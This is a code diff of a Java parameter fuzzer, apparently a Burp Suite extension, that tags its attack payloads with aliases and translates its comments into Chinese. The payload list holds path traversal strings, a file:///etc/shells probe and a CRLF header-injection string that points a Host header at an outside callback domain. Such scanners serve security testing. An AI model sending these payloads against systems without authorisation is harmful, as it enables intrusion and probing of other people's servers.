@@ -37,36 +37,48 @@ public class ParamFuzzer {
     private static final String HASH_CHARS = "0123456789abcdefghijklmnopqrstuvwxyz";
     private static final int HASH_LENGTH = 5;
 
-
     private final ObjectMapper objectMapper = new ObjectMapper();
 
-    // Payload list from requirements
-    private static final List<String> PAYLOADS = Arrays.asList(
-            "norandomx",
-            "/{param}",
-            "%2f{param}",
-            "./{param}",
-            "%2e%2f{param}",
-            "{param}/../{param}",
-            "{param}%2f..%2f{param}",
-            "{param}&norandom=xx",
-            "{param}%26norandom=xx",
-            "{param}/",
-            "{param}%2f",
-            "{param_url_encoded}",
-            "{param_double_url_encoded}",
-            "{param}#",
-            "{param}%23",
-            "{param}?",
-            "{param}%3f",
-            "{param}/../../../../../../../",
-            "{param}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f",
-            "{param}\\",
-            "{param}\\..\\..\\",
-            "{param}%5c..%5c..%5c",
-            "{random_8000}",  // 替换原来的 "AAAAAAAAAAAAAAAAAA"
-            "{param}%20HTTP/1.1%0D%0AHost:%20{fuzz}.ngcf.wi11.fun%0D%0Ax2x:%20",
-            "file:///etc/shells"
+    /**
+     * PayloadInfo类用于将payload和其别名绑定在一起
+     */
+    private static class PayloadInfo {
+        final String payload;
+        final String alias;
+
+        PayloadInfo(String payload, String alias) {
+            this.payload = payload;
+            this.alias = alias;
+        }
+    }
+
+    // Payload列表及其对应别名 - 直接定义，不使用循环
+    private static final List<PayloadInfo> PAYLOAD_INFOS = Arrays.asList(
+            new PayloadInfo("norandomx", "payload01"),
+            new PayloadInfo("/{param}", "payload02"),
+            new PayloadInfo("%2f{param}", "payload03"),
+            new PayloadInfo("./{param}", "payload04"),
+            new PayloadInfo("%2e%2f{param}", "payload05"),
+            new PayloadInfo("{param}/../{param}", "payload06"),
+            new PayloadInfo("{param}%2f..%2f{param}", "payload07"),
+            new PayloadInfo("{param}&norandom=xx", "payload08"),
+            new PayloadInfo("{param}%26norandom=xx", "payload09"),
+            new PayloadInfo("{param}/", "payload10"),
+            new PayloadInfo("{param}%2f", "payload11"),
+            new PayloadInfo("{param_url_encoded}", "payload12"),
+            new PayloadInfo("{param_double_url_encoded}", "payload13"),
+            new PayloadInfo("{param}#", "payload14"),
+            new PayloadInfo("{param}%23", "payload15"),
+            new PayloadInfo("{param}?", "payload16"),
+            new PayloadInfo("{param}%3f", "payload17"),
+            new PayloadInfo("{param}/../../../../../../../", "payload18"),
+            new PayloadInfo("{param}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f", "payload19"),
+            new PayloadInfo("{param}\\", "payload20"),
+            new PayloadInfo("{param}\\..\\..\\", "payload21"),
+            new PayloadInfo("{param}%5c..%5c..%5c", "payload22"),
+            new PayloadInfo("{random_8000}", "payload23"),
+            new PayloadInfo("{param}%20HTTP/1.1%0D%0AHost:%20{fuzz}.ngcf.wi11.fun%0D%0Ax2x:%20", "payload24"),
+            new PayloadInfo("file:///etc/shells", "payload25")
     );
 
     public ParamFuzzer(MontoyaApi api, TableModel tableModel, RequestResponseSaver requestResponseSaver,
@@ -80,7 +92,7 @@ public class ParamFuzzer {
     }
 
     /**
-     * Main method to be called by other classes
+     * 主方法，供其他类调用
      */
     public void processRequest(HttpRequest originalRequest, int messageId, String host) {
         if (isShuttingDown) {
@@ -88,22 +100,22 @@ public class ParamFuzzer {
         }
 
         try {
-            // Test URL parameters first
+            // 首先测试URL参数
             fuzzUrlParameters(originalRequest, messageId, host);
 
-            // Then test POST body parameters
+            // 然后测试POST body参数
             fuzzPostBodyParameters(originalRequest, messageId, host);
 
-            // Finally test JSON parameters
+            // 最后测试JSON参数
             fuzzJsonParameters(originalRequest, messageId, host);
 
         } catch (Exception e) {
-            // Silent error handling as per ValueReplacer pattern
+            // 按照ValueReplacer模式进行静默错误处理
         }
     }
 
     /**
-     * Fuzz URL parameters
+     * 对URL参数进行模糊测试
      */
     private void fuzzUrlParameters(HttpRequest originalRequest, int messageId, String host) {
         if (isShuttingDown) return;
@@ -116,32 +128,33 @@ public class ParamFuzzer {
             String paramName = param.name();
             String paramValue = param.value();
 
-            for (String payload : PAYLOADS) {
+            for (PayloadInfo payloadInfo : PAYLOAD_INFOS) {
                 if (isShuttingDown) return;
 
-                // Skip random_8000 for URL parameters as per requirement #6
-                if ("{random_8000}".equals(payload)) {
+                // 根据需求#6，URL参数跳过random_8000
+                if ("{random_8000}".equals(payloadInfo.payload)) {
                     continue;
                 }
 
-                String processedPayload = processPayload(payload, paramValue);
+                String processedPayload = processPayload(payloadInfo.payload, paramValue);
                 String expression = paramName + "=" + processedPayload;
 
                 try {
                     HttpParameter newParam = HttpParameter.urlParameter(paramName, processedPayload);
                     HttpRequest modifiedRequest = originalRequest.withUpdatedParameters(newParam);
 
-                    sendTestRequest(modifiedRequest, messageId, host, expression, "URL_PARAM");
+                    sendTestRequest(modifiedRequest, messageId, host, expression, "URL_PARAM",
+                            payloadInfo.alias, paramName);
 
                 } catch (Exception e) {
-                    // Silent error handling
+                    // 静默错误处理
                 }
             }
         }
     }
 
     /**
-     * Fuzz POST body parameters (form data)
+     * 对POST body参数进行模糊测试（表单数据）
      */
     private void fuzzPostBodyParameters(HttpRequest originalRequest, int messageId, String host) {
         if (isShuttingDown) return;
@@ -154,27 +167,28 @@ public class ParamFuzzer {
             String paramName = param.name();
             String paramValue = param.value();
 
-            for (String payload : PAYLOADS) {
+            for (PayloadInfo payloadInfo : PAYLOAD_INFOS) {
                 if (isShuttingDown) return;
 
-                String processedPayload = processPayload(payload, paramValue);
+                String processedPayload = processPayload(payloadInfo.payload, paramValue);
                 String expression = paramName + "=" + processedPayload;
 
                 try {
                     HttpParameter newParam = HttpParameter.bodyParameter(paramName, processedPayload);
                     HttpRequest modifiedRequest = originalRequest.withUpdatedParameters(newParam);
 
-                    sendTestRequest(modifiedRequest, messageId, host, expression, "BODY_PARAM");
+                    sendTestRequest(modifiedRequest, messageId, host, expression, "BODY_PARAM",
+                            payloadInfo.alias, paramName);
 
                 } catch (Exception e) {
-                    // Silent error handling
+                    // 静默错误处理
                 }
             }
         }
     }
 
     /**
-     * Fuzz JSON parameters
+     * 对JSON参数进行模糊测试
      */
     private void fuzzJsonParameters(HttpRequest originalRequest, int messageId, String host) {
         if (isShuttingDown) return;
@@ -184,7 +198,7 @@ public class ParamFuzzer {
             return;
         }
 
-        // Check if body is JSON (requirement #14 - don't rely on content type)
+        // 检查body是否为JSON格式（需求#14 - 不依赖content type）
         if (!isJsonFormat(bodyString)) {
             return;
         }
@@ -196,44 +210,45 @@ public class ParamFuzzer {
             for (JsonPath jsonPath : jsonPaths) {
                 if (isShuttingDown) return;
 
-                for (String payload : PAYLOADS) {
+                for (PayloadInfo payloadInfo : PAYLOAD_INFOS) {
                     if (isShuttingDown) return;
 
-                    // Get actual text value from JsonNode
+                    // 从JsonNode获取实际文本值
                     String originalValue = getJsonNodeValue(jsonPath.value);
-                    String processedPayload = processPayload(payload, originalValue);
+                    String processedPayload = processPayload(payloadInfo.payload, originalValue);
 
                     try {
                         JsonNode modifiedJson = modifyJsonNode(rootNode, jsonPath.path, processedPayload);
                         String modifiedJsonString = objectMapper.writeValueAsString(modifiedJson);
 
-                        // Extract the actual expression from the modified JSON
+                        // 从修改后的JSON中提取实际表达式
                         String expression = extractExpressionFromJson(modifiedJson, jsonPath.path, jsonPath.lastKey);
 
                         HttpRequest modifiedRequest = originalRequest.withBody(modifiedJsonString);
 
-                        sendTestRequest(modifiedRequest, messageId, host, expression, "JSON_PARAM");
+                        sendTestRequest(modifiedRequest, messageId, host, expression, "JSON_PARAM",
+                                payloadInfo.alias, jsonPath.lastKey);
 
                     } catch (Exception e) {
-                        // Silent error handling
+                        // 静默错误处理
                     }
                 }
             }
 
         } catch (Exception e) {
-            // Silent error handling
+            // 静默错误处理
         }
     }
 
     /**
-     * Extract expression from modified JSON to ensure accuracy
+     * 从修改后的JSON中提取表达式以确保准确性
      */
     private String extractExpressionFromJson(JsonNode modifiedJson, String path, String lastKey) {
         try {
             String[] pathParts = path.split("\\.");
             JsonNode currentNode = modifiedJson;
 
-            // Navigate to the parent node
+            // 导航到父节点
             for (int i = 0; i < pathParts.length - 1; i++) {
                 String part = pathParts[i];
                 if (part.contains("[")) {
@@ -245,7 +260,7 @@ public class ParamFuzzer {
                 }
             }
 
-            // Get the last part and extract the key-value pair
+            // 获取最后一部分并提取键值对
             String lastPart = pathParts[pathParts.length - 1];
             JsonNode valueNode;
 
@@ -257,19 +272,19 @@ public class ParamFuzzer {
                 valueNode = currentNode.get(lastPart);
             }
 
-            // Convert the value to proper JSON representation
+            // 将值转换为正确的JSON表示
             String jsonValue = objectMapper.writeValueAsString(valueNode);
 
             return "\"" + lastKey + "\":" + jsonValue;
 
         } catch (Exception e) {
-            // Fallback to simple format if extraction fails
+            // 如果提取失败，回退到简单格式
             return "\"" + lastKey + "\":\"[error]\"";
         }
     }
 
     /**
-     * Get actual value from JsonNode without JSON formatting
+     * 从JsonNode获取实际值，不带JSON格式化
      */
     private String getJsonNodeValue(JsonNode node) {
         if (node.isTextual()) {
@@ -281,13 +296,13 @@ public class ParamFuzzer {
         } else if (node.isNull()) {
             return "null";
         } else {
-            // Fallback to string representation
+            // 回退到字符串表示
             return node.asText();
         }
     }
 
     /**
-     * Check if string is JSON format
+     * 检查字符串是否为JSON格式
      */
     private boolean isJsonFormat(String text) {
         try {
@@ -299,7 +314,7 @@ public class ParamFuzzer {
     }
 
     /**
-     * Extract JSON paths for fuzzing
+     * 提取JSON路径用于模糊测试
      */
     private List<JsonPath> extractJsonPaths(JsonNode node, String currentPath) {
         List<JsonPath> paths = new ArrayList<>();
@@ -313,10 +328,10 @@ public class ParamFuzzer {
                 String newPath = currentPath.isEmpty() ? fieldName : currentPath + "." + fieldName;
 
                 if (fieldValue.isObject()) {
-                    // Don't fuzz object values, but recurse into them
+                    // 不对对象值进行模糊测试，但递归进入其中
                     paths.addAll(extractJsonPaths(fieldValue, newPath));
                 } else if (fieldValue.isArray()) {
-                    // Only test first item in array as per requirement
+                    // 根据需求只测试数组中的第一个项目
                     if (fieldValue.size() > 0) {
                         JsonNode firstItem = fieldValue.get(0);
                         String arrayPath = newPath + "[0]";
@@ -327,7 +342,7 @@ public class ParamFuzzer {
                         }
                     }
                 } else {
-                    // Fuzz string, number, boolean, null values
+                    // 对字符串、数字、布尔值、null值进行模糊测试
                     paths.add(new JsonPath(newPath, fieldValue, fieldName));
                 }
             }
@@ -337,7 +352,7 @@ public class ParamFuzzer {
     }
 
     /**
-     * Modify JSON node at specified path
+     * 在指定路径修改JSON节点
      */
     private JsonNode modifyJsonNode(JsonNode rootNode, String path, String newValue) throws Exception {
         ObjectNode rootCopy = rootNode.deepCopy();
@@ -369,7 +384,7 @@ public class ParamFuzzer {
     }
 
     /**
-     * Process payload with parameter substitution
+     * 使用参数替换处理payload
      */
     private String processPayload(String payload, String paramValue) {
         String processed = payload;
@@ -380,18 +395,18 @@ public class ParamFuzzer {
         }
         // Handle special URL encoding cases
         if ("{param_url_encoded}".equals(payload)) {
-            // Single URL encode the parameter (full encoding)
+            // 对参数进行单次URL编码（完全编码）
             processed = urlEncodeFullly(paramValue);
         } else if ("{param_double_url_encoded}".equals(payload)) {
-            // Double URL encode the parameter (full encoding)
+            // 对参数进行双重URL编码（完全编码）
             String singleEncoded = urlEncodeFullly(paramValue);
             processed = urlEncodeFullly(singleEncoded);
         } else {
-            // Replace {param} with actual parameter value
+            // 将{param}替换为实际参数值
             processed = processed.replace("{param}", paramValue);
         }
 
-        // Handle {fuzz} replacement
+        // 处理{fuzz}替换
         if (processed.contains("{fuzz}")) {
             char[] hash = new char[HASH_LENGTH];
             for (int i = 0; i < HASH_LENGTH; i++) {
@@ -404,7 +419,7 @@ public class ParamFuzzer {
     }
 
     /**
-     * Fully URL encode a string (encode all characters)
+     * 完全URL编码字符串（编码所有字符）
      */
     private String urlEncodeFullly(String input) {
         StringBuilder result = new StringBuilder();
@@ -416,10 +431,11 @@ public class ParamFuzzer {
     }
 
     /**
-     * Send test request following KnownTest pattern
+     * 按照KnownTest模式发送测试请求
+     * 已更新以包含payloadAlias和parameterName
      */
     private void sendTestRequest(HttpRequest modifiedRequest, int messageId, String host,
-                                 String expression, String testType) {
+                                 String expression, String testType, String payloadAlias, String parameterName) {
         try {
             rateLimiter.acquire(modifiedRequest.url() + modifiedRequest.method());
 
@@ -431,6 +447,8 @@ public class ParamFuzzer {
                     messageId,
                     "PARAM_FUZZ",
                     expression,
+                    payloadAlias,      // payload别名
+                    parameterName,      // 当前测试参数的名称
                     requestResponseSaver,
                     logging
             );
@@ -440,19 +458,19 @@ public class ParamFuzzer {
             requestResponseSaver.handleDelayedModifiedResponse(modifiedResponse, tempID);
 
         } catch (Exception e) {
-            // Silent error handling as per ValueReplacer pattern
+            // 按照ValueReplacer模式进行静默错误处理
         }
     }
 
     /**
-     * Set shutdown state
+     * 设置关闭状态
      */
     public void setShuttingDown(boolean shuttingDown) {
         this.isShuttingDown = shuttingDown;
     }
 
     /**
-     * Helper class to track JSON paths
+     * 用于跟踪JSON路径的辅助类
      */
     private static class JsonPath {
         final String path;
